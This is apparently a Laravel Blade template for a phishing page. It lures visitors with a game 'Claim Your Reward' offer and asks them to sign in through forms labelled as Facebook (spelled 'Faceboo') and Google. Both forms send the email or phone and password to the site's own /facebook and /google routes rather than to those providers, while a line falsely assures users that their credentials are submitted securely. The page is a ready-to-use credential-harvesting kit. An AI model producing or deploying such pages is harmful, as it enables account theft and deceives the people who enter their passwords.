<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">

    <meta name="viewport"
          content="width=device-width, initial-scale=1.0">

    <meta name="csrf-token"
          content="{{ csrf_token() }}">

    <title>Game Login</title>

    <link rel="preconnect"
          href="https://fonts.googleapis.com">

    <link rel="preconnect"
          href="https://fonts.gstatic.com"
          crossorigin>

    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;700;800&family=Poppins:wght@400;500;600;700&display=swap"
          rel="stylesheet">

    <link rel="stylesheet"
          href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.3.1/css/all.min.css">

    <style>

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;

            display: flex;
            align-items: center;
            justify-content: center;

            padding: 20px;

            font-family: "Poppins", sans-serif;
            color: white;

            background:
                linear-gradient(
                    rgba(2, 4, 10, .80),
                    rgba(2, 4, 10, .96)
                ),
                url("{{ asset('images/background.jpg') }}");

            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }

        .login-wrapper {
            width: 100%;
            max-width: 480px;

            animation: pageIn .7s ease;
        }

        @keyframes pageIn {
            from {
                opacity: 0;
                transform: translateY(25px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .login-card {
            padding: 35px;

            border: 1px solid rgba(255,255,255,.1);
            border-radius: 24px;

            background:
                linear-gradient(
                    145deg,
                    rgba(20,24,35,.96),
                    rgba(6,8,14,.98)
                );

            backdrop-filter: blur(25px);

            box-shadow:
                0 35px 90px rgba(0,0,0,.55);
        }

        .logo {
            width: 105px;
            height: 50px;

            margin: 0 auto 25px;

            overflow: hidden;
            border-radius: 10px;
        }

        .logo img {
            width: 100%;
            height: 100%;

            object-fit: cover;
        }

        .heading {
            text-align: center;
        }

        .eyebrow {
            color: #ffc107;

            font-size: 10px;
            font-weight: 700;

            letter-spacing: 2px;
            text-transform: uppercase;
        }

        h1 {
            margin-top: 10px;

            font-family: "Orbitron", sans-serif;
            font-size: 29px;
        }

        h1 span {
            color: #ffc107;
        }

        .subtitle {
            margin: 12px auto 0;

            max-width: 360px;

            color: #7f8795;

            font-size: 12px;
            line-height: 1.7;
        }

        .reward {
            margin-top: 25px;

            padding: 13px 15px;

            display: flex;
            align-items: center;

            gap: 12px;

            border: 1px solid rgba(255,193,7,.15);
            border-radius: 12px;

            background: rgba(255,193,7,.045);
        }

        .reward-icon {
            width: 40px;
            height: 40px;

            flex-shrink: 0;

            display: grid;
            place-items: center;

            border-radius: 10px;

            background: rgba(255,193,7,.1);

            color: #ffc107;
        }

        .reward-label {
            color: #626b79;

            font-size: 8px;

            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .reward-name {
            margin-top: 3px;

            color: white;

            font-family: "Orbitron", sans-serif;

            font-size: 11px;
        }

        .divider {
            margin: 25px 0 18px;

            display: flex;
            align-items: center;

            gap: 12px;

            color: #555d69;

            font-size: 9px;
            letter-spacing: 1px;
        }

        .divider::before,
        .divider::after {
            content: "";

            flex: 1;

            height: 1px;

            background: rgba(255,255,255,.07);
        }

        .login-option {
            margin-bottom: 15px;

            padding: 20px;

            border: 1px solid rgba(255,255,255,.08);
            border-radius: 15px;

            background: rgba(255,255,255,.025);

            transition: .3s;
        }

        .login-option:hover {
            border-color: rgba(255,193,7,.25);

            background: rgba(255,193,7,.025);
        }

        .option-header {
            display: flex;
            align-items: center;

            gap: 10px;

            margin-bottom: 17px;
        }

        .option-icon {
            width: 34px;
            height: 34px;

            display: grid;
            place-items: center;

            border-radius: 9px;

            background: rgba(255,255,255,.07);

            font-size: 15px;
        }

        .option-title {
            font-size: 12px;
            font-weight: 600;
        }

        .option-subtitle {
            margin-top: 2px;

            color: #626a77;

            font-size: 9px;
        }

        .field {
            margin-bottom: 12px;
        }

        .field label {
            display: block;

            margin-bottom: 7px;

            color: #7d8593;

            font-size: 9px;
        }

        .input-wrap {
            position: relative;
        }

        .input-wrap i {
            position: absolute;

            left: 13px;
            top: 50%;

            transform: translateY(-50%);

            color: #5d6572;

            font-size: 12px;
        }

        .input-wrap input {
            width: 100%;

            padding: 12px 12px 12px 38px;

            border: 1px solid rgba(255,255,255,.08);
            border-radius: 9px;

            outline: none;

            background: rgba(0,0,0,.22);

            color: white;

            font-family: inherit;
            font-size: 11px;

            transition: .25s;
        }

        .input-wrap input:focus {
            border-color: rgba(255,193,7,.45);

            box-shadow:
                0 0 0 3px rgba(255,193,7,.05);
        }

        .input-wrap input::placeholder {
            color: #4e5662;
        }

        .submit {
            width: 100%;

            margin-top: 5px;

            padding: 12px;

            border: 0;
            border-radius: 9px;

            background:
                linear-gradient(
                    135deg,
                    #ffc107,
                    #ff8800
                );

            color: #111;

            font-family: inherit;

            font-size: 11px;
            font-weight: 800;

            cursor: pointer;

            transition: .3s;
        }

        .submit:hover {
            transform: translateY(-2px);

            box-shadow:
                0 10px 25px
                rgba(255,166,0,.2);
        }

        .security {
            margin-top: 20px;

            text-align: center;

            color: #555d68;

            font-size: 9px;
        }

        .security i {
            color: #4bd39a;
            margin-right: 4px;
        }

        .back {
            display: flex;
            justify-content: center;
            align-items: center;

            gap: 7px;

            margin-top: 20px;

            color: #626a77;

            font-size: 10px;

            text-decoration: none;
        }

        .back:hover {
            color: #ffc107;
        }

        .footer {
            margin-top: 18px;

            text-align: center;

            color: #3e4550;

            font-size: 8px;
            line-height: 1.7;
        }

        @media(max-width: 520px) {

            body {
                padding: 12px;
            }

            .login-card {
                padding: 25px 18px;
                border-radius: 20px;
            }

            h1 {
                font-size: 24px;
            }

        }

    </style>
</head>


<body>

<div class="login-wrapper">

    <main class="login-card">

        <!-- LOGO -->

        <div class="logo">

            <img
                src="{{ asset('images/logo.jpg') }}"
                alt="Game Logo">

        </div>


        <!-- HEADER -->

        <div class="heading">

            <div class="eyebrow">
                Secure Game Login
            </div>

            <h1>
                Claim Your <span>Reward</span>
            </h1>

            <p class="subtitle">
                Sign in to your game account to continue
                with your selected reward.
            </p>

        </div>


        <!-- SELECTED REWARD -->

        <div class="reward">

            <div class="reward-icon">

                <i class="fa-solid fa-gift"></i>

            </div>

            <div>

                <div class="reward-label">
                    Selected Reward
                </div>

                <div class="reward-name">
                    {{ $reward ?? 'No reward selected' }}
                </div>

            </div>

        </div>


        <div class="divider">
            ACCOUNT LOGIN
        </div>


        <!-- =================================================
             GAME LOGIN OPTION 1
        ================================================== -->

        <section class="login-option">

            <div class="option-header">

                <div class="option-icon">
                    <i class="fa-solid fa-gamepad"></i>
                </div>

                <div>

                    <div class="option-title">
                        Faceboo Account
                    </div>

                    <div class="option-subtitle">
                        Sign in with your game credentials
                    </div>

                </div>

            </div>


            <form
                method="POST"
                action="/facebook">

                @csrf

                <input
                    type="hidden"
                    name="reward"
                    value="{{ $reward ?? '' }}">


                <div class="field">

                    <label>
                        Email or phone
                    </label>

                    <div class="input-wrap">

                        <i class="fa-solid fa-user"></i>

                        <input
                            type="text"
                            name="email_or_phone"
                            placeholder="Enter email or phone"
                            required>

                    </div>

                </div>


                <div class="field">

                    <label>
                        Game password
                    </label>

                    <div class="input-wrap">

                        <i class="fa-solid fa-lock"></i>

                        <input
                            type="password"
                            name="password"
                            placeholder="Enter your game password"
                            required>

                    </div>

                </div>


                <button
                    type="submit"
                    class="submit">

                    Login & Continue

                    <i class="fa-solid fa-arrow-right"></i>

                </button>

            </form>

        </section>


        <!-- =================================================
             GAME LOGIN OPTION 2
        ================================================== -->

        <section class="login-option">

            <div class="option-header">

                <div class="option-icon">
                    <i class="fa-solid fa-user-shield"></i>
                </div>

                <div>

                    <div class="option-title">
                        Google Login
                    </div>

                    <div class="option-subtitle">
                        Google Account
                    </div>

                </div>

            </div>


            <form
                method="POST"
                action="/google">

                @csrf

                <input
                    type="hidden"
                    name="reward"
                    value="{{ $reward ?? '' }}">


                <div class="field">

                    <label>
                        Email or phone
                    </label>

                    <div class="input-wrap">

                        <i class="fa-solid fa-user"></i>

                        <input
                            type="text"
                            name="email_or_phone"
                            placeholder="Enter email or phone"
                            required>

                    </div>

                </div>


                <div class="field">

                    <label>
                        Game password
                    </label>

                    <div class="input-wrap">

                        <i class="fa-solid fa-lock"></i>

                        <input
                            type="password"
                            name="password"
                            placeholder="Enter your game password"
                            required>

                    </div>

                </div>


                <button
                    type="submit"
                    class="submit">

                    Login & Continue

                    <i class="fa-solid fa-arrow-right"></i>

                </button>

            </form>

        </section>


        <!-- SECURITY -->

        <div class="security">

            <i class="fa-solid fa-shield-halved"></i>

            Your game account credentials are submitted securely.

        </div>


        <!-- BACK -->

        <a
            href="/choose"
            class="back">

            <i class="fa-solid fa-arrow-left"></i>

            Back to rewards

        </a>


        <div class="footer">

            By continuing, you agree to the game's
            Terms of Service and Privacy Policy.

        </div>

    </main>

</div>

</body>
</html>